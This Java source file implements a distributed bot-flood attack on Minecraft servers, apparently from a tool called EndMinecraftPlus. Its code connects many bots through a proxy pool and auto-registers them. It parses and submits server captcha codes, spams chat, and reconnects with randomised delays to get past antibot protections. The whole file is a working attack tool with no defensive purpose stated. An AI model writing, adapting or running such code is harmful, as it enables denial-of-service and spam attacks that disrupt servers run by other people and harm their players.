package luohuayu.EndMinecraftPlus.tasks.attack;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.net.SocketAddress;
import java.net.Proxy.Type;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Random;
import java.util.Scanner;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import luohuayu.EndMinecraftPlus.Utils;
import com.github.steveice10.*;
import com.github.steveice10.packetlib.*;
import com.github.steveice10.packetlib.event.session.ConnectedEvent;
import com.github.steveice10.packetlib.event.session.DisconnectedEvent;
import com.github.steveice10.packetlib.event.session.DisconnectingEvent;
import com.github.steveice10.packetlib.event.session.PacketErrorEvent;
import com.github.steveice10.packetlib.event.session.PacketReceivedEvent;
import com.github.steveice10.packetlib.event.session.PacketSendingEvent;
import com.github.steveice10.packetlib.event.session.PacketSentEvent;
import com.github.steveice10.packetlib.event.session.SessionListener;
import com.github.steveice10.packetlib.packet.Packet;
import com.github.steveice10.packetlib.tcp.TcpClientSession;
import com.github.steveice10.mc.auth.data.GameProfile;
import com.github.steveice10.mc.protocol.MinecraftProtocol;
import com.github.steveice10.mc.protocol.packet.ingame.client.ClientChatPacket;
import com.github.steveice10.mc.protocol.packet.ingame.client.ClientKeepAlivePacket;
import com.github.steveice10.mc.protocol.packet.ingame.server.ServerChatPacket;
import com.github.steveice10.mc.protocol.packet.ingame.server.ServerJoinGamePacket;

import luohuayu.EndMinecraftPlus.proxy.ProxyPool;
import xyz.yuanpi.config;

public class DistributedBotAttack extends IAttack {
	private Thread mainThread;
	private Thread tabThread;
	private Thread taskThread;
	private Thread spamThread;
	private Thread regThread;
	private Thread hhThread;
	String spammessage;

	public List<Session> clients = new ArrayList<Session>();
	public ExecutorService pool = Executors.newCachedThreadPool();

	public DistributedBotAttack(int time, int maxconnect, int joinsleep, boolean motdbefore, boolean tab,
			HashMap<String, String> modList) {
		super(time, maxconnect, joinsleep, motdbefore, tab, modList);
	}

	public static Scanner scanner = new Scanner(System.in);
	com.github.steveice10.packetlib.ProxyInfo.Type pType;
	Proxy.Type motdtType;
	String name;
	boolean custspam;
	boolean autoauth;
	boolean spam = true;
	boolean debug;
	boolean test;
	boolean ReconncetBypass;
	int ReconncetDelay;
	int spamdelay;
	int hhdelay;

	public void start(final String ip, final int port) {
		ReconncetDelay = config.toint(config.getValue("reconnectdelay"));
		ReconncetBypass = config.getBoolean("reconnectbypass");
		spamdelay = config.toint(config.getValue("spamdelay"));
		hhdelay = config.toint(config.getValue("hhdelay"));
		debug = config.getBoolean("debug");
		Utils.log("请输入名称前缀：如CNMD 末尾自动添加后缀");
		name = config.getValue("name");
		Utils.log("已选择：" + name);

		Utils.log("请选择代理类型：HTTP/SOCKS");
		String pxty = config.getValue("pxtype");
		switch (pxty) {
			case "http":
				pType = ProxyInfo.Type.HTTP;
				motdtType = Type.HTTP;
				break;
			case "socks":
				pType = ProxyInfo.Type.SOCKS4;
				motdtType = Type.SOCKS;
				break;
			default:
				Utils.log("输错了 傻逼");
				stop();

		}
		Utils.log("是否开启自动识别验证码 t/f");
		autoauth = config.getBoolean("captcha");
		Utils.log("是否开启刷屏 t/f");
		spam = config.getBoolean("spam");
		custspam = config.getBoolean("customspam");
		if (custspam) {
			spammessage = config.getValue("custommessage");

		}

		mainThread = new Thread(() -> {
			while (true) {
				try {
					cleanClients();
					createClients(ip, port);
					Utils.sleep(1 * 1000);

					Utils.log("BotThread", "连接数:" + clients.size());
				} catch (Exception e) {
					Utils.log("BotThread", e.getMessage());
				}
			}
		});
		regThread = new Thread(() -> {
			// int num = 0;
			// String passwd = "123123";
			// while (num < 10) {
			// try {
			// synchronized (clients) {
			// clients.forEach(c -> {
			// if (c.isConnected()) {
			// if (c.hasFlag("join")) {
			// c.send(new ClientChatPacket("/reg " + passwd + " " + passwd));

			// }
			// }
			// });
			// }
			// num++;
			// Thread.sleep(2000);
			// } catch (Exception e1) {
			// // TODO: handle exception
			// }
			// }

		});
		hhThread = new Thread(() -> {
			while (true) {
				try {
					synchronized (clients) {
						clients.forEach(c -> {
							if (c.isConnected() && c.hasFlag("join")) {

								c.send(new ClientChatPacket("/hh " + Utils.getRandomString(5, 10)));

							}
						});
					}
					Thread.sleep(hhdelay);
				} catch (Exception e) {
					// TODO: handle exception
					Utils.log(e);
				}

			}
		});

		spamThread = new Thread(() -> {
			while (true) {
				try {
					synchronized (clients) {
						clients.forEach(c -> {
							if (c.isConnected() && c.hasFlag("join")) {
								spammer(c, spammessage);

							}
						});
					}
					Thread.sleep(spamdelay);
				} catch (Exception e) {
				}

			}
		});

		tabThread = new Thread(() -> {
			while (true) {
				synchronized (clients) {
					clients.forEach(c -> {
						if (c.isConnected()) {
							if (c.hasFlag("join")) {
								sendTab(c,
										"//");
							}
						}
					});
				}
				Utils.sleep(100);
			}
		});

		mainThread.start();
		regThread.start();
		spamThread.start();
		hhThread.start();

		if (tabThread != null)
			tabThread.start();
		if (taskThread != null)
			taskThread.start();

	}

	@SuppressWarnings("deprecation")
	public void stop() {
		mainThread.stop();
		if (tabThread != null)
			tabThread.stop();
		if (taskThread != null)
			taskThread.stop();
		if (spamThread != null)
			spamThread.stop();
	}

	public void setTask(Runnable task) {
		taskThread = new Thread(task);
	}

	private void cleanClients() {
		List<Session> waitRemove = new ArrayList<Session>();
		synchronized (clients) {
			clients.forEach(c -> {
				if (!c.isConnected()) {
					waitRemove.add(c);
				}
			});
			clients.removeAll(waitRemove);
		}
	}

	private void createClients(final String ip, int port) {
		synchronized (ProxyPool.proxys) {
			ProxyPool.proxys.forEach(p -> {
				try {
					String[] _p = p.split(":");
					ProxyInfo proxy = new ProxyInfo(pType, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
					Proxy motdproxy = new Proxy(motdtType, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
					Session client = createClient(ip, port, name + Utils.getRandomString(4, 8), proxy);
					client.setReadTimeout(10 * 1000);
					client.setWriteTimeout(10 * 1000);
					synchronized (clients) {
						clients.add(client);
					}

					if (this.attack_motdbefore) {
						pool.submit(() -> {
							getMotd(motdproxy, ip, port);
							client.connect(false);
						});
					} else {
						client.connect(false);
					}

					if (this.attack_joinsleep > 0)
						Utils.sleep(attack_joinsleep);
				} catch (Exception e) {
					Utils.log("BotThread/CreateClients", e.getMessage());
				}
			});
		}
	}

	public Session createClient(final String ip, int port, final String username, ProxyInfo proxy) {
		GameProfile profile = new GameProfile(UUID.randomUUID(), username);
		Session client = new TcpClientSession(ip, port, new MinecraftProtocol(username), proxy);
		// Client client = new Client(ip, port, new MinecraftProtocol(username), new
		// TcpSessionFactory(proxy));
		client.addListener(new SessionListener() {
			public void packetReceived(PacketReceivedEvent e) {
				if (e.getPacket() instanceof ServerChatPacket) {
					ServerChatPacket packet = e.getPacket();
					String message = packet.getMessage().toString();
					if (debug) {
						Utils.log("[" + username + "]" + "[接收聊天]" + "[" + message + "]");
					}
					if (message.contains("来注册")) {
						String[] c0des = message.split("来注册！", 2);
						String code = Utils.getcode(5, c0des[0]);
						String passwd = Utils.getRandomString(6, 12);
						Utils.log("Code is " + code + "---" + message);
						client
								.send(new ClientChatPacket("/register " + passwd + " " + passwd + " " + code));

					}
					if (message.contains("/reg")) {
						reg(client);

					}
					if (message.contains("/login")) {
						client.send(new ClientChatPacket("/l 1234abcd"));
					}

					if (message.contains("tpserver") && !message.contains(name)) {
						client.send(new ClientChatPacket("/tpserver " + gethh(message)));

					}
					// boolean reg = message.contains("以注册") || message.contains("reg");
					// if (reg) {
					// String passwd = Utils.getRandomString(8, 12);
					// client.send(new ClientChatPacket("/register " + passwd + " " +
					// passwd));
					// }
					// if (true) {
					// // try to get authme code
					// boolean iscaptcha = message.contains("人机验证") || message.contains("captcha")
					// || message.contains("验证码");
					// String[] code2 = message.split("/captcha ", 2);
					// int length = config.toint(config.getValue("authmelength"));
					// if (iscaptcha) {
					// String c0de = code2[1].substring(0, length);
					// if (debug) {
					// Utils.log("Captcha is:" + c0de);
					// }
					// client.send(new ClientChatPacket("/captcha " + c0de));
					// }
					// }
				}

				if (e.getPacket() instanceof ServerJoinGamePacket) {
					e.getSession().setFlag("join", true);
					Utils.log("Client", "[连接成功][" + username + "]");

				}
			}

			public void packetSent(PacketSentEvent e) {
				if (debug) {
					if (e.getPacket() instanceof ClientChatPacket) {
						ClientChatPacket packet = e.getPacket();
						Utils.log("[Client]" + "[" + username + "]" + "[发送聊天]" + packet.getMessage());
					}
				}
			}

			public void connected(ConnectedEvent e) {
			}

			public void disconnecting(DisconnectingEvent e) {
			}

			public void disconnected(DisconnectedEvent e) {
				String msg;
				if (e.getCause() != null) {
					msg = e.getCause().getMessage();
				} else {
					msg = e.getReason();
				}
				Utils.log("Client", "[断开][" + username + "] " + msg);
				String reason = e.getReason();
				boolean blacklisted = reason.contains("已被") && reason.contains("黑名单");
				boolean stats = reason.contains("重") || reason.contains("join") || reason.contains("antibot")
						|| reason.contains("加入") || reason.contains("反")
						|| reason.contains("等") || reason.contains("Reconnect") || reason.contains("enter");
				if (stats && !blacklisted) {
					Utils.log("[" + username + "]正在重连......");
					try {
						if (ReconncetBypass) {
							Random random = new Random();
							Thread.sleep(ReconncetDelay + random.nextInt(2000));
						} else {
							Thread.sleep(ReconncetDelay);

						}
						Session client1 = createClient(ip, port, username, proxy);
						client1.setReadTimeout(10 * 1000);
						client1.setWriteTimeout(10 * 1000);
						clients.add(client1);
						client1.connect(false);
					} catch (Exception e1) {
						Utils.log(e1);
						// TODO: handle exception
					}

				}
				if (blacklisted) {

				}
			}

			@Override
			public void packetError(PacketErrorEvent arg0) {
				// TODO Auto-generated method stub

			}

			@Override
			public void packetSending(PacketSendingEvent arg0) {
				// TODO Auto-generated method stub

			}

		});
		return client;

	}

	public boolean getMotd(Proxy proxy, String ip, int port) {
		try {
			Socket socket = new Socket(proxy);
			socket.connect(new InetSocketAddress(ip, port));
			if (socket.isConnected()) {
				OutputStream out = socket.getOutputStream();
				InputStream in = socket.getInputStream();
				out.write(new byte[] { 0x07, 0x00, 0x05, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01 });
				out.write(new byte[] { 0x01, 0x00 });
				out.flush();
				in.read();

				try {
					in.close();
					out.close();
					socket.close();
				} catch (Exception e) {
				}

				return true;
			}
			socket.close();
		} catch (Exception e) {
		}
		return false;
	}

	public void sendTab(Session session, String text) {
		try {
			// session.send((Packet) new ClientSwingArmPacket());
			session.send((new ClientKeepAlivePacket(1)));
		} catch (Exception e) {
		}
	}

	public void spammer(Session session, String message) {
		if (!custspam) {
			message = Utils.getclnmsl();
		}
		session.send((Packet) new ClientChatPacket(message + Utils.getRandomString(3, 5)));
	}

	public void reg(Session session) {
		try {
			String passwd = Utils.getRandomString(8, 8);
			session.send(
					new ClientChatPacket("/reg " + passwd + " " + passwd));
			// String email;
			// email = Utils.getRandomString(4, 8) + "@163.com";
			// session.send(new ClientChatPacket("/emailplus bind " + email));
			// session.send(new ClientChatPacket("/email add " + email + "@163.com "
			// + email + "@163.com"));
			// Thread.sleep(3000);
			// session.send(new ClientChatPacket("/hub"));
			// session.send(new ClientChatPacket("/lobby"));
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	public static String gethh(String msgString) {
		String[] token = msgString.split("/tpserver ", 2);
		String[] token1 = token[1].split("\"}", 2);
		return token1[0];

	}
}
